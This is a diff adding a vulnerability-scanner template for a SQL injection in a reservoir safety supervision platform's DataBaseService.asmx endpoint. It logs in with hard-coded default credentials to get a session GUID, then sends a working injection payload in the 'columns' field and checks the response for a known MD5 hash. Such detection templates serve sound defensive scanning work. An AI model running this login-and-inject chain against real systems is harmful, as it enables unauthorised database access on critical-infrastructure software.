@@ -1,0 +1,71 @@
+id: CVD-2022-5567
+info:
+  name: SQL Injection in Reservoir Safety Supervision Platform
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The reservoir safety supervision platform developed by Tangshan Pingsheng Electronic Technology Development Co., Ltd. contains a SQL injection vulnerability in the WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns endpoint. Attackers can use this to gain database privileges, compromise sensitive information, and execute commands on the server.
+  reference:
+    - https://fofa.so/
+  classification:
+    cvss-score: 7.5
+    cwe-id: CWE-89
+
+variables:
+  guid: ""
+
+http:
+  - id: login-request
+    name: Login Request
+    raw:
+      - |
+        POST /WebServices/WebAdminService.asmx/Login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        LoginName=Data86&LoginPwd=Data86%40
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+          - "Guid"
+    extractors:
+      - type: regex
+        name: guid
+        internal: true
+        group: 1
+        part: body
+        regex:
+          - 'Guid\":\"(.*?)\"}'
+
+  - id: sql-injection-check
+    name: SQL Injection Check
+    raw:
+      - |
+        POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        loginIdentifer={{guid}}&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
